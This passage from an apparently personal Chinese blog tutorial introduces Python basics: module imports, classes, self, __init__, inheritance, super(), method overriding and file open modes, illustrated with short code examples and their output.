<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;a&#39;: &#39;a&#39;, &#39;b&#39;: &#39;b&#39;, &#39;c&#39;: &#39;c&#39;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h1><table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>import</code>关键字</td>
<td align="right">如导入库</td>
</tr>
<tr>
<td align="center"><code>from</code>关键字</td>
<td align="right">指定库里面的函数</td>
</tr>
<tr>
<td align="center"><code>as</code>关键字</td>
<td align="right">指定库里面的函数进行改名</td>
</tr>
</tbody></table>
<h2 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h2><p>用到<code>import</code>语句如导入库</p>
<p><strong>a.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">unm</span>):</span></span><br><span class="line">    print(unm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name2</span>(<span class="params">unm</span>):</span></span><br><span class="line">    print(unm)</span><br></pre></td></tr></table></figure>
<p><strong>a2.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> a</span><br><span class="line">a.name(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">a.name2(<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>输出结果</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br></pre></td></tr></table></figure>
<h2 id="from语句"><a href="#from语句" class="headerlink" title="from语句"></a>from语句</h2><p>from语句可以给库里面的指定函数到现在的文件里面</p>
<p><strong>a.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">unm</span>):</span></span><br><span class="line">    print(unm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name2</span>(<span class="params">unm</span>):</span></span><br><span class="line">    print(unm)</span><br></pre></td></tr></table></figure>
<p><strong>a2.py文件内容</strong></p>
<p>不用在输入<code>.</code>了</p>
<p>a库里面的name和name2函数导入到了a2.py里</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span>  name,name2</span><br><span class="line">name(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">name2(<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br></pre></td></tr></table></figure>
<h2 id="as语句"><a href="#as语句" class="headerlink" title="as语句"></a>as语句</h2><p>指定库里面的函数进行改名</p>
<p><strong>a.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">unm</span>):</span></span><br><span class="line">    print(unm)</span><br></pre></td></tr></table></figure>
<p><strong>a2.py文件内容</strong></p>
<p>下面的 a 库里面的name函数给名指定成a了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span>  name <span class="keyword">as</span> a</span><br><span class="line">a(<span class="string">&#x27;abcd&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abcd</span><br></pre></td></tr></table></figure>
<h2 id="导入库全部函数"><a href="#导入库全部函数" class="headerlink" title="导入库全部函数"></a>导入库全部函数</h2><p>语法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>



<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>类里面的函数叫做方法</p>
<p>python和PHP的类的定义是差不多的都是属性方法定义就不</p>
<p><strong>php的类的定义</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $属性名 =值;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> 变量名 =值;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> 方法名(<span class="params"><span class="string">&quot;行参&quot;</span></span>)</span>&#123;</span><br><span class="line">		xxxxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>python的类的定义</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> 方法名(<span class="params">self,参数</span>):</span></span><br><span class="line">        <span class="comment"># 属性</span></span><br><span class="line">		self.属性</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">对象变量=类名()</span><br></pre></td></tr></table></figure>
<p><strong>python的类简单演示</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">   <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">metode</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;abcd&quot;</span>)</span><br><span class="line">        </span><br><span class="line">Dog=Name()</span><br><span class="line">Dog.metode()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abcd</span><br></pre></td></tr></table></figure>
<h2 id="self是什么"><a href="#self是什么" class="headerlink" title="self是什么"></a>self是什么</h2><p>python里面self是必须有的</p>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>我当前记得学习这个的时候研究了很长时间下面就简单解释一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">metode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 输出self内存地址</span></span><br><span class="line">        print(id(self))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">Dog=Name()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出对象内存地址</span></span><br><span class="line">print(id(Dog))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用Name类里面的metode()方法</span></span><br><span class="line">Dog.metode()</span><br></pre></td></tr></table></figure>
<p>代码</p>
<p>下面<code>id()</code>函数是显示变量内存地址的</p>
<p>下面创建一个<code>Name()</code>类里面有一个<code>metode()</code>方法，</p>
<p><code>Dog=Name()</code>创建一名字Dog对象</p>
<p><code>print(id(Dog))</code>输出输出对象内存地址</p>
<p><code>Dog.metode()</code>调用Name类里面的metode()方法</p>
<p><code>print(id(self)) </code>输出self内存地址</p>
<p>结果</p>
<p>可以看见结果是一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">140682412227600</span><br><span class="line">140682412227600</span><br></pre></td></tr></table></figure>
<p><strong>可以这样理解self就是对象Dog</strong></p>
<h3 id="为什么要有self"><a href="#为什么要有self" class="headerlink" title="为什么要有self"></a>为什么要有self</h3><p><strong>下类面代码不用self的问题</strong></p>
<p><strong>下面是没有报错的代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">metode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 输出Dog对象里面的Die_Verskil属性</span></span><br><span class="line">        print(Dog.Die_Verskil)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在Dog对象里面添加Die_Verskil属性，他的值是abcde</span></span><br><span class="line">Dog.Die_Verskil=<span class="string">&#x27;abcde&#x27;</span></span><br><span class="line"><span class="comment"># 调用对象Dog的metode()方法</span></span><br><span class="line">Dog.metode()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abcde</span><br></pre></td></tr></table></figure>
<p>然后我们叫代码<code>Dog.Die_Verskil=&#39;abcde&#39;</code>放到最后</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">metode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 输出Dog对象里面的Die_Verskil属性</span></span><br><span class="line">        print(Dog.Die_Verskil)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用对象Dog的metode()方法</span></span><br><span class="line">Dog.metode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在Dog对象里面添加Die_Verskil属性，他的值是abcde</span></span><br><span class="line">Dog.Die_Verskil=<span class="string">&#x27;abcde&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>可以看见就报错了self就是解决这个问题的</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210127123414610.png" alt="image-20210127123414610"></p>
<h2 id="init-方法"><a href="#init-方法" class="headerlink" title="__init__方法"></a><code>__init__</code>方法</h2><p>这个方法在创建对象的时候自动被调用</p>
<p>演示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建对象的时候自动被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;你不调用我，我也会自己被调用！&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你不调用我，我也会自己被调用！</span><br></pre></td></tr></table></figure>
<h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建对象的时候自动被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,a</span>):</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 添加属性默认值</span></span><br><span class="line">    	self.a=a</span><br><span class="line">    <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Uitset</span>(<span class="params">self</span>):</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 用self输出属性</span></span><br><span class="line">        print(self.a)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name(<span class="string">&quot;你好！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对象Dog调用Uitset</span></span><br><span class="line">Dog.Uitset()</span><br></pre></td></tr></table></figure>
<p><code>__init__</code>方法里面添加一个形参a</p>
<p>任何创新对象的时候传参是<code>“你好”</code></p>
<p><code>__init__</code>方法在创建对象的时候被调用然后添加属性<code>self.a</code>值是传的<code>“你好”</code></p>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你好！</span><br></pre></td></tr></table></figure>
<h2 id="添加属性默认值"><a href="#添加属性默认值" class="headerlink" title="添加属性默认值"></a>添加属性默认值</h2><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建对象的时候自动被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,die=<span class="string">&quot;我是默认值&quot;</span></span>):</span></span><br><span class="line">        <span class="comment"># 添加属性默认值</span></span><br><span class="line">    	self.die=die</span><br><span class="line">    <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Uitset</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 用self输出属性</span></span><br><span class="line">        print(self.die)</span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对象Dog调用Uitset</span></span><br><span class="line">Dog.Uitset()</span><br></pre></td></tr></table></figure>
<p>在<code>__init__</code>方法里添加<code>self.die</code>属性他值是<code>&quot;我是默认值&quot;</code></p>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我是默认值</span><br></pre></td></tr></table></figure>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>比如有两个类，a类和b类里面的有一个不一样，在写代码的时候里面都要写重复的麻烦，我们就可以用继承，类里面用其他的类，</p>
<p><strong>比如b类调用（继承）a类，这个a类就是父类b类就是子类</strong></p>
<p><strong>b类继承a类会拥有a类的全部方法和属性</strong></p>
<h3 id="继承的格式"><a href="#继承的格式" class="headerlink" title="继承的格式"></a>继承的格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名(<span class="params">父类名</span>):</span></span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
<h3 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h3><p>下面<code>Name2(Name1)</code>类里面有<code>Name1</code>类，就是继承成了<code>Name1</code>全部的方法和属性，</p>
<p><code>Name2</code>就有一个<code>Uitset</code>方法但是继承了<code>Name1</code>类的全部属性方法就可以输出<code>abc</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name1</span>:</span></span><br><span class="line">	<span class="comment"># 创建Long方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Long</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="comment"># 创建Year方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Year</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name2</span>(<span class="params">Name1</span>):</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment"># 创建Uitset方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Uitset</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 用self输出属性</span></span><br><span class="line">        print(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># Name2创建对象       </span></span><br><span class="line">Dog=Name2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对象Dog调用</span></span><br><span class="line">Dog.Long()</span><br><span class="line">Dog.Year()</span><br><span class="line">Dog.Uitset()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<h3 id="super-对父类方法扩充"><a href="#super-对父类方法扩充" class="headerlink" title="super()对父类方法扩充"></a>super()对父类方法扩充</h3><p>super()可以调用父类的方法 <strong>注意是方法</strong></p>
<table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>super()</code>函数</td>
<td align="right">函数是用于调用父类(超类)的一个方法</td>
</tr>
</tbody></table>
<p>代码</p>
<p>下面在18行调用调用Name2类的Uitset()方法</p>
<p>Uitset()方法方法里面用super()调用Name1父类iong()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name1</span>:</span></span><br><span class="line">	<span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">iong</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="comment"># 创建类继承Name1父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name2</span>(<span class="params">Name1</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Uitset</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 用super()调用Name1父类iong()方法</span></span><br><span class="line">        super().iong()</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用Name2类的Uitset()方法</span></span><br><span class="line">Dog.Uitset()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc</span><br></pre></td></tr></table></figure>
<p><strong>演示复杂一点的</strong></p>
<p>下面这个代码可能比较复杂一点</p>
<p>19行创建对象，给<code>Name2</code>类传一个<code>abc</code>实参，然后会传给Name2子类的<code>__init__</code>的a的形参</p>
<p>然后super()就会和Name1父类的<code>__init__</code>连接起来，然后Name2子类有一个a的传给Name1父类的<code>__init__</code>里面的a</p>
<p>22行就调用父类的<code>iong</code>的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name1</span>:</span></span><br><span class="line">	<span class="comment"># 创建对象的时候自动被调用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,a</span>):</span></span><br><span class="line">        self.a=a</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建方法   </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">iong</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(self.a)</span><br><span class="line"><span class="comment"># 创建类继承Name1父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name2</span>(<span class="params">Name1</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建方法,传一个形参</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,a</span>):</span></span><br><span class="line">        <span class="comment"># 用super()调用Name1父类__init__方法</span></span><br><span class="line">        super().__init__(a)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name2(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用Name2类的Name1父类的iong()方法</span></span><br><span class="line">Dog.iong()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc</span><br></pre></td></tr></table></figure>
<h3 id="重新类的方法"><a href="#重新类的方法" class="headerlink" title="重新类的方法"></a>重新类的方法</h3><p>很简单就是在子类里面创建一个给父类名一样的方法，就会输出子类的新创建的方法，不会输出父类那个和子类同名的方法</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name1</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建方法   </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Re</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;123&quot;</span>)</span><br><span class="line"><span class="comment"># 创建类继承Name1父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name2</span>(<span class="params">Name1</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建方法，和父类的方法一样</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Re</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"><span class="comment"># 创建对象       </span></span><br><span class="line">Dog=Name2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用Name2类的Re()方法</span></span><br><span class="line">Dog.Re()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p>可以看见这个就是重新类的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abc</span><br></pre></td></tr></table></figure>
<h1 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h1><h2 id="单类导入"><a href="#单类导入" class="headerlink" title="单类导入"></a>单类导入</h2><p>代码</p>
<p><code>a2.py</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name1</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建方法   </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Iong</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name2</span>():</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建方法  </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Re</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;abc&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><code>a.py</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开a2模块，到a2里面的Name1类</span></span><br><span class="line"><span class="keyword">from</span>  a2 <span class="keyword">import</span> Name1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">cat=Name1()</span><br><span class="line"><span class="comment"># 输出Name1()里面的Iong()方法</span></span><br><span class="line">cat.Iong()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123</span><br></pre></td></tr></table></figure>
<h2 id="导入多个类"><a href="#导入多个类" class="headerlink" title="导入多个类"></a>导入多个类</h2><p>导入多个类和导入单个类差</p>
<p><code>a2.py</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name1</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建方法   </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Iong</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name2</span>():</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建方法  </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Re</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;abc&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><code>a.py</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开a2模块，到a2里面的Name1类和Name2类</span></span><br><span class="line"><span class="keyword">from</span>  a2 <span class="keyword">import</span> Name1,Name2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">cat1=Name1()</span><br><span class="line">cat2=Name2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出Name1()里面的Iong()方法</span></span><br><span class="line">cat1.Iong()</span><br><span class="line"><span class="comment"># 输出Name2里面的Re()方法</span></span><br><span class="line">cat2.Re()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<h2 id="导入全部类"><a href="#导入全部类" class="headerlink" title="导入全部类"></a>导入全部类</h2><p>这个我就不演示了</p>
<p>他的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  a2 <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<h1 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h1><p>文件操作常用到的函数</p>
<table>
<thead>
<tr>
<th align="center">方法/函数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>open()</code>函数</td>
<td align="right">打开文件，并返回文件的对象</td>
</tr>
<tr>
<td align="center"><code>close()</code>方法</td>
<td align="right">关闭文件</td>
</tr>
<tr>
<td align="center"><code>read()</code>方法</td>
<td align="right">读取整个文件，将文件内容放到一个字符串变量中</td>
</tr>
<tr>
<td align="center"><code>readline()</code>方法</td>
<td align="right">读取一行，然后他会移动到下一行</td>
</tr>
<tr>
<td align="center"><code>write()</code> 函数</td>
<td align="right">可以向文件中写入指定内容</td>
</tr>
</tbody></table>
<h2 id="open-打开文件"><a href="#open-打开文件" class="headerlink" title="open()打开文件"></a>open()打开文件</h2><p>打开文件，并返回文件的对象,如果没有文件则返回一个出现异常</p>
<p>open()函数的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">open(<span class="string">&quot;文件名&quot;</span>,<span class="string">&#x27;打开方式，如果不添加默认是r&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>下面是打开类型</p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">t</td>
<td align="left">文本模式 (默认)。</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">二进制模式。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">打开一个文件进行更新(可读可写)。</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">通用换行模式（不推荐）。</td>
</tr>
<tr>
<td align="left">r</td>
<td align="left">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td align="left">rb</td>
<td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">r+</td>
<td align="left">打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td align="left">rb+</td>
<td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="left">wb</td>
<td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">w+</td>
<td align="left">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="left">wb+</td>
<td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td align="left">ab</td>
<td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td align="left">a+</td>
<td align="left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td align="left">ab+</td>
<td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody></table>
<p>比如</p>
